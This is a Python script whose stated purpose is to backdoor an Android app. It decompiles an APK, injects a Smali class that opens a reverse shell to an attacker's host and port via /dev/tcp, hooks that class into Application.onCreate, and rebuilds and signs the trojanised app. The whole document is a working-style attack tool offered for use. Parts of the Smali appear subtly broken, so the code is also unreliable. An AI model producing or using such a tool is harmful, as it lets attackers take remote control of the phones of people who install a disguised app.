import os
import subprocess
import shutil

def run_command(command, cwd=None):
    result = subprocess.run(command, shell=True, cwd=cwd)
    if result.returncode != 0:
        raise Exception(f"Command failed: {command}")

def backdoor_apk(template_apk, lhost, lport, output_apk):
    decompiled_dir = "decompiled_apk"
    payload_smali_file = "payload.smali"
    key_store = "my-release-key.jks"  # you need to generate this
    alias = "alias_name"
    keystore_pass = "password"

    # Step 1: Decompile the APK
    print("[*] Decompiling APK...")
    run_command(f"apktool d -f {template_apk} -o {decompiled_dir}")

    # Step 2: Add malicious Smali payload
    print("[*] Injecting reverse shell payload...")
    smali_dir = os.path.join(decompiled_dir, "smali", "com", "example", "payload")
    os.makedirs(smali_dir, exist_ok=True)

    smali_code = f"""
.class public Lcom/example/payload/Backdoor;
.super Ljava/lang/Object;

.method public static start()V
    .registers 5

    new-instance v0, Ljava/lang/ProcessBuilder;
    const-string v1, "/system/bin/sh"
    invoke-direct {{v0, v1}}, Ljava/lang/ProcessBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {{v0}}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;
    move-result-object v2

    const-string v3, "sh -i >& /dev/tcp/{lhost}/{lport} 0>&1\\n"
    invoke-virtual {{v2}}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v4

    invoke-virtual {{v4}}, Ljava/io/OutputStream;->write([B)V
    return-void
.end method
"""

    with open(os.path.join(smali_dir, "Backdoor.smali"), "w") as f:
        f.write(smali_code)

    # Step 3: Hook into Application.onCreate()
    print("[*] Hooking payload into Application class...")

    app_smali = None
    for root, dirs, files in os.walk(decompiled_dir):
        for file in files:
            if file.endswith(".smali") and "Application" in file:
                app_smali = os.path.join(root, file)
                break

    if not app_smali:
        raise Exception("Could not find Application class to hook")

    with open(app_smali, "r") as f:
        content = f.read()

    hook_code = """
    invoke-static {}, Lcom/example/payload/Backdoor;->start()V
    """.strip()

    content = content.replace(".method public onCreate()", f""".method public onCreate()
    {hook_code}
    """)

    with open(app_smali, "w") as f:
        f.write(content)

    # Step 4: Rebuild APK
    print("[*] Rebuilding APK...")
    run_command(f"apktool b {decompiled_dir} -o {output_apk}")

    # Step 5: Sign APK
    print("[*] Signing APK...")
    run_command(f"apksigner sign --ks {key_store} --ks-pass pass:{keystore_pass} --key-pass pass:{keystore_pass} --out signed_{output_apk} {output_apk}")

    print(f"[+] Backdoored APK generated: signed_{output_apk}")

# Example usage
if __name__ == "__main__":
    backdoor_apk(
        template_apk="legit_app.apk",
        lhost="192.168.1.100",
        lport="4444",
        output_apk="backdoored.apk"
    )
